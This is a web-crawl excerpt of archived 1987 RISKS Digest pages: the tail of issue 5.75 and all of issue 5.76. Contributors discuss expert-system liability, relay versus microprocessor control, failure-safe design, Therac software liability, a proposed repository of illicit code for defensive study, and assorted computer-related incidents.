through 5.71 --- one argument is "it's just like a book".  I disagree.
The fact is that a book is completely Passive, but an expert system
may be Active.  One must ask a book for advice, but the expert
system may offer advice on its own, or even act in your behalf.

Consider a car with expert system controlled drive-by-wire steering.
When it fails, the manufacturer is liable, and it may turn out that
the expert system made an erroneous decision.  In that case, who, in
addition to the automobile company, is liable?

Bjorn N. Freeman-Benson,University of Washington

</PRE>
<HR><H3><A NAME="subj2.5">
Sue Who?  (Re: <A HREF="/Risks/5.71.html">RISKS-5.71</A>)
</A>
</H3>
<address>
William Swan
&lt;<A HREF="mailto:uw-beaver!tikal!sigma!bill@RUTGERS.EDU ">
uw-beaver!tikal!sigma!bill@RUTGERS.EDU 
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 11:07:24 pst
</i><PRE>
Organization: Summation Inc, Kirkland WA

&gt;From: "Jerry Leichter (LEICHTER-JERRY@CS.YALE.EDU)"
&gt;Subject: re:  Can you sue an expert system
&gt;[...] "If an expert system gives bad advice, who can I sue?"  I find it
&gt;extremely disturbing that this is considered an interesting question by
&gt;ANYONE, let alone by technically sophisticated people. It is a symptom of
&gt;the pervasiveness of our misplaced trust in buzzwords and, more generally,
&gt;in computers:  If the computer said it, it MUST be right.  [...]

I wonder.

You believe instruction manuals, don't you? And try to follow the procedures
therein? I can show you a service manual for my pickup that is very wrong at
one step.

A true story:

Last week I was dealing with a new copier, which had its "entire" manual
on-line. I needed to do two-sided copies and was overwhelmed by the numerous
buttons and cryptic icons on the thing. No problem, I pressed "help" and the
display walked me through the setup. Very nice! It even walked me through 
clearing a paper jam or two - even telling me where within the machine the 
paper jammed and how to get there ("lift lever A", "raise lid B", etc).

Suddenly I got a message, "remove paper from duplexor". What's a duplexor? I
pressed help, and got.. "remove paper from duplexor". I checked all the
mechanics on top. No paper. I cleared the paper trays. Nothing out of place.
I opened the doors to the insides, the display says "close front door". I
close the door and look elsewhere. Nothing. I open the doors again, it says
"close front door". I close the doors and cycle power on the machine. I try a
copy, it says "remove paper from duplexor". I open the machine up (it says
"close front door") and hunt through the innards. No paper.

Finally, I find a secretary (it's after hours but she's still there) who
tells me what a duplexor is and where it is. I return to the machine, open
the doors (it says "close front door"), find the duplexor and remove the
sheet, close the doors (it says "ready") and continue copying!

What did I do wrong? Believe the computer? I don't think so (C'mon, I know
better than *that* :-). I had instead been led to put my trust in an 
incomplete set of procedures. More knowledge (i.e. what a "duplexor" was)
would have helped prevent me from making this error. 

The problem I ran into, and one that I'm sure we'll see more and more often,
is that this form of the information hid its incompleteness. If I had had
a printed manual with no reference to "duplexor" I would have known it was
incomplete. This mechanised manual hid that information from me and, worse,
led me astray by behaving as if it were not incomplete.

If this had been a situation with serious consequences I believe I would 
have very good cause for litigation.

</PRE>
<HR><H3><A NAME="subj2.6">
re:  Can you sue an expert system (<A HREF="/Risks/5.71.html">RISKS-5.71</A>)
</A>
</H3>
<address>
Wm Brown III 
&lt;<A HREF="mailto:Brown@GODZILLA.SCH.Symbolics.COM">
Brown@GODZILLA.SCH.Symbolics.COM
</A>&gt;
</address>
<i>
Wed, 9 Dec 87 17:55 PST
</i><PRE>
To: RISKS FORUM &lt;RISKS@KL.SRI.COM&gt;

 From: "Jerry Leichter (LEICHTER-JERRY@CS.YALE.EDU)"
  &lt;LEICHTER@VENUS.YCC.YALE.EDU&gt;
 Subject: re:  Can you sue an expert system

 In <A HREF="/Risks/5.69.html">RISKS-5.69</A>, Barry Stevens becomes another in a long line of people to raise
 the question "If an expert system gives bad advice, who can I sue?"  I find it
 extremely disturbing that this is considered an interesting question by
 ANYONE, let alone by technically sophisticated people.  It is a symptom of the
 pervasiveness of our misplaced trust in buzzwords and, more generally, in
 computers:  If the computer said it, it MUST be right.

I find it extremely disturbing that ANYONE on this list would make such a
statement.  Judging from the length of the diatribe which followed this
preamble, I must conclude that Mr. Leichter really has strong feelings and
quite a lot to say on the subject, and therefore must find it somewhat more
interesting than he admits to.  Personally, I think that the realities of
turning software, especially expert systems, loose on the world are very close
indeed to the center of this forum's domain.

When software of this type is sold to professionals who know its limitations,
or who understand that its output is an 'opinion' rather than a statement of
hard facts, I agree that it is not reasonable for those users to turn around
and sue if they get burned by depending upon it.  This, however, is a very
small subset of the potential users for expert systems.

Lawsuits are society's way of enforcing product specifications and warranties.
Taking away this mechanism is equivalent to voiding these contracts.  One way
to look at things is that this is an important check which will discourage the
offering of immature or inferior products.  It is a very effective way of
making marketeers "Put their money where their mouth is."

There are definitely cases where expert systems are of value because they
offer potential savings in time; consider an 'advisor' for hospital emergency
rooms which gives every third-shift physician the knowledge equivalent of
twenty top specialists and a medical library, but much quicker.  Users of this
system simply won't have the time to second guess the 'expert' or cross check
every literature reference, but if this system gives incomplete advice it will
sooner or later kill someone.  Should the physician on duty be responsible for
deciding whether to follow the system's advice, even if he doesn't understand
the specialty involved?  Should the hospital let some patients die for lack of
quick decisions rather than buy this system?  Should state legislatures
indemnify some or all of the players from lawsuits, thus legitimizing the
concept that anything the computer says is gospel?  Clearly, the legal aspects
will be a large factor in the equation which decides when or if such systems
will be installed.

On a more mundane scale, consider the original example of a personal finance
advisor.  If it is offered as a novelty, with pages of disclaimers and
explainations of why no sane person would rely on its advice, who will buy it
except as a toy?  On the other hand, if it comes with the usual marketing
banners describing it as the answer to everyone's financial questions, the end
user certainly has some right to expect that it will give good advice.
Whether this right extends to the point of filing lawsuits is properly a
matter to be decided by a jury, based upon the facts in each individual case;
it would be just as wrong to give blanket protection to software vendors as it
would be to legislate all responsibility onto their shoulders.

To say that this topic is complex or ill-defined is an understatement.  To say
that it is not interesting is a personal opinion which I will hotly contest.
If expert systems are to progress from academic curiosities to everyday-life
applications, they will have to be useable by non-computer types who need fast
and reliable answers, not philosophical disertations or legal disclaimers.

NOTE:  The opinions expressed are my own and do not necessarily represent
those of my employer or anyone else.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Microprocessors vs relay logic (<A HREF="/Risks/5.65.html">RISKS-5.65</A>)
</A>
</H3>
<address>
Wm Brown III 
&lt;<A HREF="mailto:Brown@GODZILLA.SCH.Symbolics.COM">
Brown@GODZILLA.SCH.Symbolics.COM
</A>&gt;
</address>
<i>
Wed, 9 Dec 87 17:55 PST
</i><PRE>
To: RISKS FORUM &lt;RISKS@KL.SRI.COM&gt;

Two cents worth on the relative virtues of microprocessors vs. relay logic for
railway control systems.  (Continuing the discussion started in RISKS 5.65).

There is such a thing as choosing the right tool for a job.  About fifteen
years ago, I did some design work on a motion control system for amusement
rides.  The improvements since then in reliability and cost of mini and micro
computers has changed things, and I don't know whether I would draw the same
conclusions today, but at the time the best solution appeared to be relays
with a mini backing them up and monitoring for control system failures.
Here's why:

&gt;&gt;&gt;Well designed relays have a conservative life expectancy of 100 million 
operations (that's 1E8).  They don't particularly care how long each
operation lasts; things only wear when they move.  Given a typical rate
of 100 operations per hour, this works out to 1 million (1E6) hours
of ACTUAL USE before they start to die.  Idle hours don't count.

Computers typically have a fairly constant MTBF, regardless of what they are
doing for those hours.  Turning them on and off may substantially reduce this
time, so it is difficult to decide whether it is better to leave the system on
all day and use up 24 hours of life per day or power it on and off every day.
Either way, not many computers come close to the million-hour level.

&gt;&gt;&gt;Somewhere in the system, your controller has to connect to a real world
full of spikes, transients, dirt, water, and unionized maintainence techs
with 250 watt soldering irons.  Relays are pretty imune to nearby lightning
hits, poylester shirts, etc.  Anything which permanently damages them tends
to make them fail completely.

Computers can be brought down by anything from dry days to alpha particles.  
Worse yet, they may drop a bit without noticing it and you will never be 
able to figure out exactly what happened.  Yes, it is feasible to program 
in a lot of redundancy, but it is still possible for a glitch in the 
housekeeping routines to clobber the functional code or working storage.

&gt;&gt;&gt;Flexibilty is great when you want to control a ride and balance your
checkbook on the same machine, however there are some cases where the
same flexibility is useless or even dangerous.  If you want the system
to perform the same way, day after day, it is tough to beat hardwired
control logic.  If something DOES go wrong, it is usually much easier
to deduce how and why when the logic paths are soldered down.

&gt;&gt;&gt;Failures in relay logic tend to be more localized.  A stuck contact
in track zone 5 may someday permit one car to tail-end the next, but
it won't affect zone 8 at all.  If the same CPU is controlling the
entire system it can spread havoc everywhere instantly.

No, I don't sell relays or even use them any more.  This just seemed germane
to the original discussion.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.74.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.76.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-28</DOCNO>
<DOCOLDNO>IA012-000130-B022-396</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.76.html 128.240.150.127 19970217014636 text/html 22923
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:45:02 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 76</TITLE>
<LINK REL="Prev" HREF="/Risks/5.75.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.77.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.75.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.77.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 76</H1>
<H2> Wednesday 16 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Designing for Failure 
</A>
<DD>
<A HREF="#subj1.1">
Don Wegeng
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer MTBF and usage 
</A>
<DD>
<A HREF="#subj2.1">
Andy Freeman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Liability and software bugs 
</A>
<DD>
<A HREF="#subj3.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Need for Reporting Systems 
</A>
<DD>
<A HREF="#subj4.1">
Paul Garnet
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Tom Swift and his Electric Jockstrap 
</A>
<DD>
<A HREF="#subj5.1">
Arthur Axelrod
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Expert Systems 
</A>
<DD>
<A HREF="#subj6.1">
Amos Shapir
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The Saga of the Lost ATM Card 
</A>
<DD>
<A HREF="#subj7.1">
Scott E. Preece
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Telephone Billing Risks 
</A>
<DD>
<A HREF="#subj8.1">
Fred Baube
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: F4 in 'Nam (Reversed signal polarity causing accidents) 
</A>
<DD>
<A HREF="#subj9.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  For Lack of a Nut (NASDAQ Power outage revisited)  
</A>
<DD>
<A HREF="#subj10.1">
Bill McGarry
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Dutch Database Privacy Laws 
</A>
<DD>
<A HREF="#subj11.1">
Henk Cazemier
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Designing for Failure
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
16 Dec 87 15:59:38 EST (Wednesday)
</i><PRE>
To: RISKS@KL.SRI.COM
From: Don Wegeng &lt;Wegeng.Henr@Xerox.COM&gt;

In RISKS 5.75 Wm Brown III makes some interesting observations about the
reliability differences between microprocessors and relay logic (prompted by a
discussion about using microprocessors to control railroad switching). What I
would like to discuss here is how systems react when a portion of the system
*does* fail. Since I am involved in the design of microprocessor-based
real-time control systems, this area is of great interest to me.

In my opinion designers should always consider the worst situation that can
result from the failure of a component. Part of this should include determining
what events might be missed or ignored if a particular component fails. The
system's reaction to the component failure must take these events into account.
For example, a microprocessor might be used in a robot arm to monitor an
electric eye that detects when something is in the path of the arm. If the
microprocessor fails the system's reaction must include whatever it would do if
the electric eye beam had been broken, for there is no way for the system to
determine the state of the beam (and it must assume worse case). Note that all
of this does little good if the system does not detect that the microprocessor
failed (and detecting the failure may be a bigger problem than reacting to it).

Computer control has the potential to allow greater flexibility than previous
technologies. This flexibility brings with it new risks (which have been
discussed many times in RISKS). It is essential that such systems be designed
so that their reaction to failures will be predictable and safe.
                                                                     Don

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer MTBF and usage
</A>
</H3>
<address>
Andy Freeman 
&lt;<A HREF="mailto:ANDY@Sushi.Stanford.EDU">
ANDY@Sushi.Stanford.EDU
</A>&gt;
</address>
<i>
Tue 15 Dec 87 19:20:17-PST
</i><PRE>
To: RISKS@KL.SRI.COM, Brown@[128.81.38.39]

Wm Brown III &lt;Brown@GODZILLA.SCH.Symbolics.COM&gt; writes:
    Computers typically have a fairly constant MTBF, regardless of what
    they are doing for those hours.  Turning them on and off may
    substantially reduce this time, ...

Professor Ed McCluskey at Stanford has shown that the MTBF of computer
systems does depend on usage/load.  This isn't surprising for software, but
I remember seeing something (in an abstract) about how load affects hardware
failures as well.  It was surprising enough to remember, but not interesting
enough for me to investigate further.
                                                -andy

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Liability and software bugs
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Reply-To: nancy@ics.UCI.EDU
Date: Tue, 15 Dec 87 19:20:03 -0800
From: Nancy Leveson &lt;nancy%murphy.uci.edu@ROME.UCI.EDU&gt;

In Risks 5.75, George Bray writes with respect to the Therac accident:

   &gt;On the other hand, I believe that the bug was due to an unforeseen
   &gt;interaction that would be very hard to eliminate.  These kinds of bugs
   &gt;probably exist in much of the software in thw [sic] world.

If a reasonable person would agree that bugs exist in much of the present
software, then it seems that it is also reasonable that features be built into
the system to protect against such bugs.  Non-computerized versions of such
machines usually contain interlocks to prevent such catastrophic behavior.
These same interlocks can be built into the software (or into the hardware) to
protect against software errors.  If it is standard practice to include such
features by hardware engineers, should it not be standard practice for software
engineers?  Shouldn't somebody have thought to include "reasonableness" checks
in the AECL software?  I have heard aeronautical engineers speak of a "safety
envelope" and seen them include design features to detect when the safety
envelope is violated and to recover from such events.  It is often possible to
determine the "safety envelope" of software behavior and include checks when it
is being violated.  Of course, checking routines can also have bugs in them,
but they are often much simpler than the original software and provide an
independent check that reduces the risk, probably significantly.

Do we teach programmers to expect software errors and to build the software
to detect and handle erroneous or unsafe states resulting from software bugs?  
If manufacturers of hardware devices can be sued for not taking reasonable care 
by including safety features in their devices, couldn't manufacturers of 
software be similarly liable for not doing the same?

[By the way, for those interested, I have heard that AECL has settled out of
court with the families of the victims.  There is still one suit outstanding in
which the hospital where two people were killed is suing for their money back.
They do not believe that the problems have truly been fixed and do not want to
use the machine anymore.  One might note that AECL claimed the problem was
fixed before a third person was killed a year ago in Yakima].

Nancy Leveson, UCI

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Need for Reporting Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:pgarnet@nswc-wo.ARPA">
pgarnet@nswc-wo.ARPA
</A>&gt;
</address>
<i>
Wed, 9 Dec 87 14:09:01 est
</i><PRE>
Cc: pgarnet@csl.sri.com

In Risks 5.71 Eugene Miya suggests 

&lt; If we are ever going to progress out of the software muck, we are going 
&lt; to have to come up with mechanisms to replace all of our anecdotal
&lt; information with better information.

I agree.  One part of the 'software muck' is illicit code, e.g., Trojan
horses, viruses, etc.  It is EXTREMELY difficult to obtain any examples of
illicit code, as any organization which has been bitten by one of these
bugs does not want to be responsible for exacerbating the situation by
letting the illicit code out to possibly infect another system.

The software security community needs to study the diseases which we are
trying to defend against, as potential defenses created in a vacuum of
information will only work in a vacuum.  A clearinghouse, repository,
library, or whatever name one wants to give to such a function should be
set up so that those of us who are trying to build defenses can have
subjects to study.  

There are, however, a number of sticky issues revolving about setting up
such a clearinghouse.  

	1) How do you trust the repository?  How does one know that
information given to the repository will not be abused, nor will it be used
against the giver? 

	2) How does the clearinghouse know who to disseminate which
information to in order not to violate issue number 1?  How does one decide
on who has a legitimate need to see 'dangerous' information, e.g., details
on viruses, trap doors, etc.

	3) The clearinghouse must not be an information sink, sucking up
information from anyone willing to donate their examples but never giving
any information out.  It must be clear that the purpose of the
clearinghouse is to facilitate the sharing of information in a non-
threatening way.

	4) The clearinghouse must not be an organization that people are
inherently scared of, "If I tell them what happened, what are they going to
do to me?"

	5) There must be some mechanism to validate the information coming to
the clearinghouse to insure that it is correct.  We do not want a
repository of misleading, invalid data.

	6) Who's going to pay for this service?

There are organizations which collect information about computer crime. 
One which immediately comes to mind is SRI.  Maybe this or some other
organization could be a starting point?

One issue which will certainly come up in trying to collect, organize, and
disseminate this information will be classification.  Is the data
unclassified, classified (C,S,TS,...), sensitive, proprietary, ...?  I
believe that if issue number one, trust in the clearinghouse, is solved,
the issue of putting information in its proper category is administratively
solvable.  

I could see great value in collecting examples of illicit code (and, of
course, corresponding risks).  What have people really done?  How can we
learn from the examples?  What generic technical defenses can be developed
which specific companies/organizations can then apply to their systems?

Anyone interested in discussing these issues in a workshop setting, either
classified or unclassified, commercial or government - please contact me.

Maybe we can come up with a workable mechanism to not only replace all of
our anecdotal information, but to persuade some of the hidden information
to come out of the woodwork.
                                    Paul Garnett (pgarnet@NSWC-WO.ARPA)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Tom Swift and his Electric Jockstrap
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
14 Dec 87 13:48:43 PST (Monday)
</i><PRE>
From: "Arthur_Axelrod.WBST128"@Xerox.COM
To: RISKS@csl.sri.com

  From the Rochester (NY) Democrat and Chronicle, Sunday Dec. 13, 1987.
  Without permission.
  
  GAMBLER WHO WIRED HIMSELF TO COMPUTER FACES TRIAL
  
  Carson City [AP] -- The [Nevada] state Supreme Court upheld a ruling against 
  a man who wired his athletic supporter to a hidden microcomputer to improve 
  his odds of winning at blackjack.  The ruling Thursday revived a charge of
  possessing a cheating device that had been filed against Philip Preston
  Anderson in Las Vegas.
  
  According to the court, Anderson strapped a microcomputer to his calf.  Wires
  ran to switches in his shoes that he could tap with his toes to keep track of
  the cards that had been played.  The computer calculated Anderson's advantage
  or disadvantage with the house and sent "vibratory signals to a special
  receiver located inside an athletic supporter," the Supreme Court said.
  
[The gentleman must be very well endowed.  Otherwise the state Supreme Court
would have declined to hear the case, on the ancient legal principle, "de
minimis non curat lex." -- ARA]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Expert Systems (RISKS DIGEST 5.75)
</A>
</H3>
<address>
Amos Shapir
&lt;<A HREF="mailto:nsc!taux01!taux01.UUCP!amos@Sun.COM ">
nsc!taux01!taux01.UUCP!amos@Sun.COM 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 16 Dec 87 14:35:05 GMT
Organization: National Semiconductor (Israel) Ltd. Home of the 32532
Hdate: 25 Kislev 5748

It seems the main problem is blindly relying on expert systems, because of lack
of time and expertise. A well designed expert system should therefore give not
only the answers, but also the decision path by which it got at them. A country
doctor may not have all the knowledge that a hospital system provides, but may
well be qualified to judge whether a decision like 'the patient has blue eyes
therefore it's pneumonia' is valid in a particular case.

Amos Shapir, National Semiconductor (Israel)
6 Maskit st. P.O.B. 3007, Herzlia 46104, Israel  Tel. +972 52 522261
amos%taux01@nsc.com (used to be amos%nsta@nsc.com) 

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
The Saga of the Lost ATM Card
</A>
</H3>
<address>
Scott E. Preece
&lt;<A HREF="mailto:preece%fang@gswd-vms.Gould.COM ">
preece%fang@gswd-vms.Gould.COM 
</A>&gt;
</address>
<i>
Tue, 15 Dec 87 09:26:28 CST
</i><PRE>

  From: Alan Wexelblat &lt;wex%SW.MCC.COM@MCC.COM&gt;
&gt; They helpfully informed me that they had no way of retreiving my card,
&gt; but if I was willing to hang around for a while "...the machine will
&gt; probably spit it out."  ...  MBank returns them cut up, you see. ...

Well, that's better than having it hand the card to the next person to use the
machine, anyway.  Actually, my own bank's machine swallowed my card once, for
no known reason (it never even acknowledged that the card had been inserted).
The bank sent me a new card and said the machine cut the card when it claimed
it.  In retrospect, this is probably a good idea -- the machine probably
claimed the card because it couldn't read the stripe; I would imagine the
probability of a read failure on a card which has already failed once is
higher than on a card picked at random.  So I'd rather not have a
known-to-be-flakey card, anyway.

Of course, I also have a wife who has a card, so I'm easier about the
time delay than if that were my only access to the system...

scott preece, gould/csd - urbana    uucp: ihnp4!uiucdcs!ccvaxa!preece

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Telephone Billing Risks
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri, 11 Dec 87 11:45:25 -0500
From: Fred Baube &lt;fbaube@note.nsf.gov&gt;

This is a follow-up to the article about the woman in West Germany who
incorrectly returned her telephone handset to its cradle after a call to
Africa, generating a phone bill of $1710 for 10 hours.  It was reported here
that the woman was told she could settle for one-third the amount, $570.

  From _World_Weekly_News_, excerpted without permission:

  "The stubborn old widow flatly refused to pay the bill.  Then a
  judge ordered that she need only pay $570.  Still she refused.

  The judge threatened to toss her in the slammer.

  "I said 'OK, go ahead and put me in prison,'" she declared ..  
  " Well, that's what he did.  They took me to jail .. I spent one 
  night in jail.  It was horrible .. The next day they said I could 
  go if I would pay for only five minutes of the call.

  "I said sure I would .. but not a penny more.  Then I came home.
  But I'm still hopping mad !"

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: F4 in 'Nam (Reversed signal polarity causing accidents)
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Thu, 10 Dec 87 13:11:29 EST
</i><PRE>

&gt; ...the low-tech means that the pilots developed to deal with the problem...
&gt; was to wire a pair of bayonets to the "rails" on either side of the ejection
&gt; seat so that the points projected above the pilot's head.

There are ejection-seat systems nowadays, in fact, that rely on such "canopy
breakers" rather than using a canopy-ejection system.  This does depend on
having a relatively thin canopy; it wouldn't work on the thick one-piece
canopies used on most new US fighters.  But it's certainly simpler and more
reliable than automatic canopy ejection.

Mind you, there is a negative side to having a relatively thin canopy.  There
was a recent accident in Britain, not yet explained in detail, which *might*
have been due to the parachute-deployment system of an ejection seat firing
*through* the canopy by accident (i.e. not as part of an ejection) and pulling
the pilot out of the plane after it.  The plane (a Harrier) unfortunately
kept on flying and eventually ran out of fuel over deep ocean.  Recovering
it will be difficult, but may be tried because more information is badly
needed.

(In case you're wondering why a parachute-deployment system should operate
so violently:  in an ejection at low altitude, getting the parachute out and
inflated *immediately* is very important.)

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
For Lack of a Nut (NASDAQ Power outage)   [Refinement of <A HREF="/Risks/5.72.html">RISKS-5.72</A>]
</A>
</H3>
<address>
Bill McGarry
&lt;<A HREF="mailto:decvax!bunker!wtm@ucbvax.Berkeley.EDU ">
decvax!bunker!wtm@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Sun, 13 Dec 87 23:23:00 EDT
</i><PRE>

[As noted in <A HREF="/Risks/5.72.html">RISKS-5.72</A>, the NASDAQ over-the-counter computer system was
knocked out of service for several hours on December 9th].  A squirrel
carrying a piece of ALUMINUM FOIL made contact with some electrical equipment
at a electrical substation.  Although there was a power outage in the area,
apparently NASDAQ suffered only a power dip (I assume that they have some form
of backup power) but this power dip was enough to shut the system down [...
for] over 3 1/2 hours before most services were restored.
                              				     Bill McGarry
{philabs, decvax, fortune, yale}!bunker!wtm

   [Curses, FOILED again?  Maybe the squirrel was hungry and went for the 
   power DIP (which was SPIKED).   (By the way, this was at least the THIRD
   squirrel power case noted in RISKS -- see RISKS-4.2 for two others.)  PGN]

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Dutch Database Privacy Laws (Re: <A HREF="/Risks/5.68.html">RISKS-5.68</A>)
</A>
</H3>
<address>
Henk Cazemier
&lt;<A HREF="mailto:cognos!henkc@zorac.ARPA ">
cognos!henkc@zorac.ARPA 
</A>&gt;
</address>
<i>
Thu, 10 Dec 87 12:02:41 EST
</i><PRE>
Organization: Cognos Inc., Ottawa, Canada

&gt;From: Robert Stanley &lt;roberts%cognos%math.waterloo.edu@RELAY.CS.NET&gt;
&gt;Subject: Dutch Database Privacy Laws
&gt;First of all, there is the classic problem of protected software. We use Sun/3
&gt;workstations, and the first engineering response to problems is swap out the
&gt;processor board (our workstations are single-board).  [...]

Actually, most replacement boards do NOT have an idprom when we receive them
from SUN. SUN highly recommends that you retain your original idprom, which
is what we do.

Henk Cazemier                                    P.O. Box 9707
Cognos Incorporated                              3755 Riverside Dr.
VOICE:  (613) 738-1440   FAX: (613) 738-0002     Ottawa, Ontario
UUCP: decvax!utzoo!dciem!nrcaer!cognos!henkc     CANADA  K1G 3Z4

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.75.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.77.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-29</DOCNO>
<DOCOLDNO>IA012-000130-B022-417</DOCOLDNO>
<DOCHDR>
